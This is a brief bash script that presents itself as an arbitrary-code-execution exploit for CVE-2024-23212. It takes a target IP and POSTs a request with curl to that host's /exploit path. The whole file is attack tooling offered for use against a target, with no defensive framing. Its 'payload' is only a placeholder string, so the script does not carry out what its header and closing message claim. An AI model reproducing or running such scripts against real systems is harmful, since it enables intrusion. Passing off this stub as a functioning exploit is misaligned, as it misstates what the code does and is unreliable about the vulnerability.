#!/bin/bash
# CVE-2024-23212: Arbitrary Code Execution
# Usage: arbitrary_code_execution.sh <target_ip>

TARGET_IP=$1

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "Exploiting arbitrary code execution on: $TARGET_IP"

curl -s http://$TARGET_IP/exploit -d 'payload=arbitrary_code_execution'

echo "Exploit completed."
